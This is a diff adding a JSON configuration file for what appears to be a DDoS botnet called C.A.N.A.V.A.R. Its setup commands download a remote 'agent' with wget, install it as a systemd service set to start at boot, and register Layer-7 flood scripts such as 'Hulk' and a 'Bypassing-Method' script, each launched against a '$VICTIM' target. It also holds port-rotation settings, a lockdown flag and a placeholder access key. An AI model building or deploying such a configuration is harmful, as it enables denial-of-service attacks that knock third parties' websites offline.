@@ -1,0 +1,50 @@
+{
+  "setup": {
+    "init": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python2 -y;",
+    "download_agent": "cd /; mkdir canavarl7; cd canavarl7; wget $AGENTLINK;",
+    "download_script": "cd /canavarl7/; mkdir -p scripts; cd/canavarl7/scripts/; wget $SCRIPTLINK -O $SCRIPTNAME;",
+    "service_setup": "cd /lib/systemd/system/; wget $SERVICELINK -O $SERVICENAME; systemctl daemon-reload; systemctl start $SERVICENAME; systemctl enable $SERVICENAME;",
+    "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
+    "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
+    "serviceName": "canavarl7.service"
+  },
+  "scripts": [
+    {
+      "id": "97ae0e0c0fd1fc7616e4ef2e190de65f",
+      "name": "Hulk",
+      "lang": "python",
+      "filename": "hulk.py",
+      "dictation": "python2 hulk.py $VICTIM",
+      "description": "Basic L7 Script, Recommended",
+      "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/hulk.py"
+    },
+    {
+      "id": "b98e97d8ba98b17c43f8b9ab1ad4837b",
+      "name": "DMC",
+      "lang": "python",
+      "filename": "custommatter.py",
+      "dictation": "python2 custommatter.py $VICTIM",
+      "description": "Customized Bypassing-Method L7 Script",
+      "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/custommatter.py"
+    },
+    {
+      "id": 4,
+      "name": "sasasasa"
+    }
+  ],
+  "global": {
+    "port": {
+      "number": 8778,
+      "changeAt": 1636604324000,
+      "changeTo": 2816,
+      "last": 4545
+    },
+    "restart": {
+      "scheduled": false,
+      "at": null,
+      "last": 1636242889000
+    },
+    "lockdown": true,
+    "accessKey": "foobar"
+  }
+}
